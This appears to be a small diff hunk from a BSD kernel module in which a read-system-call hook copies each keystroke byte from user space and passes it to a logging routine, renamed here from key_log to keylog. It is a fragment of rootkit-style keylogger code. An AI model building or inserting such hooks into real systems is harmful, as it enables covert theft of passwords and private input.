@@ -450,7 +450,7 @@ read_hook(struct thread *td, void *syscall_args)
 	    char keybuf[1];
             copyin(uap->buf, keybuf, 1);
  
-            int keyError = key_log(td, keybuf);
+            int keyError = keylog(td, keybuf);
             if(keyError)
 	        return(keyError);
 	}
